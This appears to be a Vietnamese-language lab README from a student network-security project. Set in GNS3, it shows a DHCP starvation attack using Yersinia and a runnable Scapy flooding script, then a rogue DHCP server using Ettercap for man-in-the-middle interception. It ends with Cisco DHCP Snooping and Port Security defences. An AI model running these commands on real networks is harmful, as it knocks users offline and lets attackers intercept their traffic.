# 💣 Lab: DHCP Starvation (DoS) & Rogue DHCP Server (MITM)

## 🎯 Mục tiêu bài Lab
Bài lab này đi sâu vào việc khai thác điểm yếu của giao thức DHCP (Dynamic Host Configuration Protocol) trong mạng nội bộ. Bạn sẽ thực hiện hai cuộc tấn công liên hoàn:
1. **DHCP Starvation (Denial of Service):** Gửi hàng loạt yêu cầu cấp phát IP với địa chỉ MAC giả mạo để vắt kiệt dải (pool) IP của máy chủ DHCP hợp lệ.
2. **Rogue DHCP Server (Man-in-the-Middle):** Sau khi máy chủ thật hết IP để cấp, kẻ tấn công dựng lên một máy chủ DHCP giả mạo để cấp phát IP, Default Gateway và DNS Server độc hại cho các máy trạm mới gia nhập mạng, từ đó đánh chặn toàn bộ lưu lượng.

## ⚙️ Môi trường & Công cụ
* **Nền tảng:** GNS3
* **Thiết bị:** Cisco Routers (đóng vai trò DHCP Server & Client), Cisco Switches
* **Máy tấn công:** Kali Linux
* **Công cụ:** Yersinia, Scapy (Python), Ettercap / Metasploit

## 🚀 Kịch bản tấn công (Attack Scenarios)

### Giai đoạn 1: DHCP Starvation (Làm cạn kiệt IP)
Sử dụng công cụ `yersinia` hoặc script Python để liên tục tạo ra các gói tin DHCP DISCOVER với địa chỉ MAC nguồn ngẫu nhiên.

**Thực thi bằng Yersinia:**
```bash
# Khởi chạy Yersinia chế độ đồ họa để dễ thao tác
yersinia -G
# Hoặc chạy lệnh trực tiếp nhắm vào giao thức DHCP
yersinia dhcp -attack 1 -interface eth0
```

**Thực thi bằng Python/Scapy (Tạo DHCP Discover flooding):**
```python
from scapy.all import *

def dhcp_starvation():
    while True:
        # Tạo MAC ngẫu nhiên cho mỗi request
        rand_mac = RandMAC()
        
        # Tạo gói tin DHCP DISCOVER
        ether = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=mac2str(rand_mac))
        dhcp = DHCP(options=[("message-type", "discover"), ("end")])
        
        pkt = ether / ip / udp / bootp / dhcp
        sendp(pkt, iface="eth0", verbose=0)
        print(f"[*] Đã gửi DHCP Discover với MAC: {rand_mac}")

dhcp_starvation()
```

### Giai đoạn 2: Thiết lập Rogue DHCP Server (MITM)
Khi máy chủ DHCP thật đã cạn kiệt IP (kiểm tra bằng lệnh `show ip dhcp binding` trên Router Cisco), kẻ tấn công kích hoạt máy chủ DHCP giả mạo.

**Thực thi bằng Ettercap:**
Cấu hình Ettercap để cấp phát IP độc hại và ép Default Gateway trỏ về IP của máy Kali Linux.
```bash
# Chỉnh sửa file cấu hình etter.conf nếu cần thiết, sau đó chạy:
ettercap -T -q -i eth0 -M dhcp:192.168.1.100-200/255.255.255.0/192.168.1.5
# Trong đó 192.168.1.5 là IP của máy tấn công (Kali)
```
*Lúc này, bất kỳ máy nạn nhân nào xin cấp IP đều sẽ bị điều hướng lưu lượng qua máy Kali, cho phép kẻ tấn công bắt gói tin, đánh cắp thông tin hoặc chuyển hướng DNS.*

## 🛡️ Biện pháp phòng thủ (Mitigation)
Để chống lại cả hai hình thức tấn công này, các quản trị viên mạng cần áp dụng tính năng **DHCP Snooping** và **Port Security** trên Switch Layer 2.

1. **Bật DHCP Snooping toàn cục và trên VLAN:**
```bash
Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 1,10,20
```

2. **Chỉ định cổng tin cậy (Trust Port) kết nối với DHCP Server thật:**
Chỉ những cổng được cấu hình `trust` mới được phép phản hồi các gói tin DHCP OFFER và DHCP ACK.
```bash
Switch(config)# interface e0/0
Switch(config-if)# ip dhcp snooping trust
```

3. **Ngăn chặn DHCP Starvation bằng cách giới hạn số lượng request:**
```bash
Switch(config)# interface range e0/1 - 3
Switch(config-if-range)# ip dhcp snooping limit rate 10
```

4. **Kích hoạt Port Security (tùy chọn bổ sung):**
Giới hạn số lượng địa chỉ MAC tối đa được phép học trên mỗi cổng Access.
```bash
Switch(config-if-range)# switchport port-security
Switch(config-if-range)# switchport port-security maximum 2
Switch(config-if-range)# switchport port-security violation restrict
```

---
*Project by Nguyen Gia Bao (Hoa Bảo Lục) - 2026*